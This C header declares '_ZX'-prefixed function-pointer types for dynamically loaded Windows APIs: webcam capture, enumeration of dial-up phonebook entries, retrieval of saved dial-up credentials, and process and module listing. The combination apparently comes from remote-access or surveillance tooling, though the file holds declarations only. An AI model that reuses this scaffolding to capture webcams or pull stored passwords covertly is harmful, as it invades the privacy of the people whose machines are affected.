#include <windows.H>
#include <Vfw.h>
#include <Ras.h>
#include <psapi.h>

typedef
HWND WINAPI  _ZXcapCreateCaptureWindow(
  LPCSTR lpszWindowName,  
  DWORD dwStyle,          
  int x,                  
  int y,                  
  int nWidth,             
  int nHeight,            
  HWND hWnd,              
  int nID                 
);

typedef
BOOL WINAPI  _ZXcapGetDriverDescription(
  WORD wDriverIndex,  
  LPSTR lpszName,     
  INT cbName,         
  LPSTR lpszVer,      
  INT cbVer           
);


typedef
DWORD WINAPI _ZXRasEnumEntries(
  LPCTSTR reserved,
  LPCTSTR lpszPhonebook,
  LPRASENTRYNAME lprasentryname,
  LPDWORD lpcb,
  LPDWORD lpcEntries
);


typedef
DWORD WINAPI _ZXRasGetEntryDialParams(
  LPCTSTR lpszPhonebook,
  LPRASDIALPARAMS lprasdialparams,
  LPBOOL lpfPassword
);


//////////////psapi

typedef
BOOL WINAPI _ZXEnumProcesses(
  DWORD* pProcessIds,
  DWORD cb,
  DWORD* pBytesReturned
);

typedef
BOOL WINAPI _ZXGetModuleInformation(
  HANDLE hProcess,
  HMODULE hModule,
  LPMODULEINFO lpmodinfo,
  DWORD cb
);

typedef
DWORD WINAPI _ZXGetModuleBaseName(
  HANDLE hProcess,
  HMODULE hModule,
  LPTSTR lpBaseName,
  DWORD nSize
);


typedef
DWORD WINAPI _ZXGetModuleFileNameEx(
  HANDLE hProcess,
  HMODULE hModule,
  LPTSTR lpFilename,
  DWORD nSize
);

typedef
BOOL WINAPI _ZXEnumProcessModules(
  HANDLE hProcess,
  HMODULE* lphModule,
  DWORD cb,
  LPDWORD lpcbNeeded
);










